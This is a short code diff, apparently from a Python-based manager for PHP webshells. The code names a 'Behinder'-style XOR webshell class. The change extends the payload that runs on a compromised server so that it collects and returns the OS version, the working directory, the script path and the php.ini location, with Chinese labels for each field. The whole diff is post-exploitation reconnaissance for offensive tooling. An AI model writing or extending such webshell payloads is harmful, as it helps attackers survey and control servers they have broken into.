@@ -78,6 +78,22 @@ array_push($infos, [
     "key" => "PHPVERSION",
     "value" => phpversion()
 ]);
+array_push($infos, [
+    "key" => "SYSTEMVERSION",
+    "value" => php_uname()
+]);
+array_push($infos, [
+    "key" => "CURRENT_FOLDER",
+    "value" => getcwd()
+]);
+array_push($infos, [
+    "key" => "CURRENT_PHP_SCRIPT",
+    "value" => __FILE__
+]);
+array_push($infos, [
+    "key" => "CURRENT_PHPINI",
+    "value" => php_ini_loaded_file()
+]);
 echo json_encode($infos);
 """
 
@@ -120,7 +136,13 @@ __all__ = [
     "PHPWebshellBehinderXor",
 ]
 
-basic_info_names = {"PHPVERSION": "当前PHP版本"}
+basic_info_names = {
+    "PHPVERSION": "当前PHP版本",
+    "SYSTEMVERSION": "系统版本",
+    "CURRENT_FOLDER": "当前目录",
+    "CURRENT_PHP_SCRIPT": "当前PHP脚本",
+    "CURRENT_PHPINI": "当前php.ini位置"
+}
 
 
 def md5_encode(s):
